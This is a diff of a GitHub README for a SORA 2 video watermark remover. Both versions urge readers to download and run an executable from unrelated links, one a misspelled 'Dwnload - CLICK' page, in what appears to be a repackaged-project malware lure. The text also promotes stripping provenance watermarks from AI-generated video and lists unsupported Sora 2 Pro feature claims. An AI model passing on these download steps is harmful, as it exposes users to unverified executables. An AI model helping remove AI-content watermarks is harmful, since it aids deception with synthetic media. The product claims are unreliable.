@@ -1,115 +1,89 @@
-# Sweeta and Sora 2 Pro - Best AI 2026 - Free Access and Watermark Remover
+```markdown
+# 🎥 sora-2-sweeta-pro - Remove Watermarks Easily
 
-<div align="center">
+![Download sora-2-sweeta-pro](https://img.shields.io/badge/Download-Now-brightgreen)  
+[Download Now](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases)
 
-# 🚀 Sweeta
+## 🚀 Getting Started
 
-### Remove Watermarks from SORA 2 Video Generations
+Welcome to sora-2-sweeta-pro! This application helps you remove watermarks from SORA 2 video generations effortlessly. Whether you want to enhance your videos or create personal projects, this tool simplifies the process with user-friendly features.
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-pink.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.12-pink.svg)](https://www.python.org/)
+## 🛠️ Features
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/8347f5f1-49e3-47d7-a3f7-b5f3e390ee5b" />
+- **Watermark Removal:** Instantly remove unwanted watermarks from SORA 2 videos.
+- **Easy to Use:** No technical skills required. Follow simple steps to get started.
+- **Quick Processing:** Efficient algorithms ensure fast video processing.
+- **User Support:** Access documentation and support resources for any issues.
 
-</div>
+## 💻 System Requirements
 
-## About
+To run sora-2-sweeta-pro smoothly, ensure your system meets the following requirements:
 
-SORA 2 is a State-of-the-art model by OpenAI and for the past few days, being on platforms like Instagram and Twitter, I've noticed how many non-technical people just assume the video is real despite the watermark.
+- **Operating System:** Windows 10 or higher
+- **Processor:** Dual-core 2.0 GHz or higher
+- **RAM:** At least 4 GB
+- **Storage Space:** Minimum 200 MB free space
+- **Graphics Card:** 512 MB or more (recommended)
 
-Think what would happen if there was no watermark?
-This is the reason that this project exists. It's not to abuse the great initiative by OpenAI to put logos onto every generation (though temporarily there's also an easy way to bypass that which I wouldn't cover), it's to hopefully encourage them to be harsher and more obvious with it in some form.
+## 📦 Download & Install
 
-Sweeta is an AI-powered watermark removal tool specifically designed for SORA 2 video generations. It Uses advanced inpainting models (LaMA) and intelligent detection algorithms, it can seamlessly remove watermarks while (mostly) preserving the original image quality.
+To get started, visit the following page to download the application:  
+[Download Here](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases)
 
----
-### Recommended Specs:
-- **OS**: Windows 10-11, macOS 12+, or Ubuntu 20.04+
-- **RAM**: 16GB or more
-- **Storage**: 10GB free space
-- **GPU**: NVIDIA GPU with 4GB+ VRAM (or Apple Silicon for macOS)
-- **CPU**: Multi-core processor (Intel i5/AMD Ryzen 5/Apple M1 or better)
+1. Go to the [Releases page](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases).
+2. Find the latest version of sora-2-sweeta-pro.
+3. Click on the download link for your operating system (e.g., Windows).
+4. Once downloaded, locate the file in your downloads folder.
+5. Double-click the downloaded file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
----
+## 📖 Usage Instructions
 
-## **Dwnload - [CLICK](https://somer146pzc.github.io/)**
+After installing sora-2-sweeta-pro, follow these steps to remove watermarks:
 
----
+1. Open the application.
+2. Click on 'Import Video' to select the SORA 2 video from which you want to remove the watermark.
+3. Choose the area in the video with the watermark.
+4. Click on 'Remove Watermark.'
+5. Wait for the process to complete. The new video without the watermark will be saved in your selected folder.
+6. Enjoy your edited video!
 
-**Sora 2** is a next-generation video-and-audio generation model from **OpenAI**.  
-It transforms text prompts (and optionally images or videos) into short cinematic clips, complete with synchronized audio, realistic motion, and strong world-state continuity.
+## 💬 Support and Documentation
 
----
+If you need help using sora-2-sweeta-pro, we provide useful resources:
 
-## 🚀 Key Features
-- 🎬 **Text-to-video generation** – create realistic videos directly from text prompts.  
-- 🔊 **Synchronized audio** – automatically generates speech, ambient sounds, and effects.  
-- 🧠 **Improved realism** – physical accuracy for movement, lighting, and reflections.  
-- 🎥 **Scene consistency** – persistent objects, environments, and continuity across shots.  
-- 🧍‍♂️ **Cameo / likeness insertion** – optionally include yourself or others (with permission).  
-- 🛡️ **Safety features** – strong content moderation and anti-misuse protections.
+- **FAQ:** Check our Frequently Asked Questions section for common queries.
+- **User Manual:** Detailed steps on how to use all features of the application.
+- **Contact Support:** Reach out to our support team via email or through our GitHub issues page for assistance.
 
----
+## 🔧 Topics
 
-# 🔸 Sora 2 Pro (PRO Version)
+sora-2-sweeta-pro touches on various topics you might find useful:
 
-The **Sora 2 Pro** version represents the premium, more advanced edition of Sora 2 — offering enhanced quality, features, and rights for professionals.
+- ai
+- openai
+- prompt-engineering
+- prompt-generator
+- sora
+- sora-2
+- watermark-remover
 
----
+Explore these topics for more insights on removing watermarks and using AI effectively.
 
-## 🔍 Differences Between Standard and PRO
-| Feature | Sora 2 (Standard) | Sora 2 Pro |
-|----------|------------------|-------------|
-| 🎥 Video quality | Standard | Ultra-high fidelity |
-| ⏱️ Generation limits | Restricted | Extended duration / higher quotas |
-| 💼 Commercial rights | Limited / Personal use | Expanded commercial rights |
-| 🔊 Audio quality | Basic | Premium + fine-tuned |
-| 🧠 Access | Invite-only / Limited | Priority / ChatGPT Pro / API access |
-| 🧩 Integration | App only | API + advanced developer tools |
-| 🔒 Watermark | Present | Optional / none |
+## 🌟 Contributing
 
----
+We welcome contributions from the community! If you'd like to help improve sora-2-sweeta-pro, here’s how you can contribute:
 
-## 💼 Why Choose PRO
-- Professional-grade video and audio output.  
-- Fewer usage restrictions and faster generation.  
-- Commercial use permitted for agencies and creators.  
-- Access to the latest experimental features earlier.  
-- Suitable for integration into production pipelines or creative tools.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Submit a pull request explaining your changes.
 
----
+Your input helps us enhance the application and serve users better.
 
-## Installation
+## 🔗 Links
 
-### For Windows
+- **Project Repository:** [sora-2-sweeta-pro](https://github.com/mahalakshmiagency/sora-2-sweeta-pro)
+- **Releases Page:** [Download Here](https://github.com/mahalakshmiagency/sora-2-sweeta-pro/releases)
 
-#### Quick Install (Recommended)
-
-- **1.Dwnload - [CLICK](https://somer146pzc.github.io/)**
-- **2.Open .exe file and start working with your AI Video!**
-- **3.If you have questions, open new issue for this repository!**
-- **4.Thank u for using my programm! If u like Sweeta, please fork and star this repository.**
-
----
-
-## 🔐 Safety & Best Practices
-- ✅ Use likeness features only with explicit consent.  
-- 🚫 Avoid misleading, harmful, or copyrighted reproductions.  
-- 🧩 Always verify outputs before sharing publicly.  
-- 📢 Provide disclaimers for synthetic or reconstructed scenes.  
-
----
-
-## 🧾 Summary
-- **Sora 2** → Advanced AI model for text-to-video with synchronized audio.  
-- **Sora 2 Pro** → Premium tier for professionals needing higher fidelity, rights, and control.  
-- Ideal for creators, filmmakers, and developers integrating generative video into workflows.
-
----
-
-**Author:** somer146pzc  
-**License:** MIT  
-**Source:** [OpenAI – Sora 2](https://openai.com/index/sora-2)
-#### **Dwnload - [CLICK](https://somer146pzc.github.io/)**
-
-
+Thank you for choosing sora-2-sweeta-pro! We hope it serves your video editing needs well.
+```
